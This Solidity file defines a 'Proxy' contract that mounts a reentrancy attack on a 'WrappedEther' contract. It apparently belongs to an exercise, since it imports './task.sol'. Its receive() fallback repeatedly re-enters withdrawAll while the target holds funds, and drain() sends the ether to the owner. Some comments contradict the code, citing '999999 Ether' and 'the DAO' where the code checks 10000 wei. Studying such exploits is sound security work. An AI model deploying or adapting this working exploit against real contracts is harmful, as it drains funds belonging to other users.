// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./task.sol";

contract Proxy {
	
  //Owner's address
  address public owner;
  address targets_;
  WrappedEther public target;
  uint256 transfered = 100000000000000;

  event Info(string);
  //Constructs the contract and stores the owner
  constructor(address address_) {
  	owner = msg.sender;
    target = WrappedEther(address_);
    targets_ = address_;
  }
  
  //Initiates the balance withdrawal
  function callWithdrawBalance() public {
  	target.withdrawAll();
  }
  
  //Fallback function for this contract.
  //If the balance of this contract is less then 999999 Ether,
  //triggers another withdrawal from the DAO.
  receive () external payable {
  	if (targets_.balance > 10000 wei) {
        emit Info("here");
    	target.withdrawAll();
    }
  }
  
  //Allows the owner to get Ether from this contract
  function drain() public payable {
  	payable(owner).transfer(address(this).balance);
  }
} 
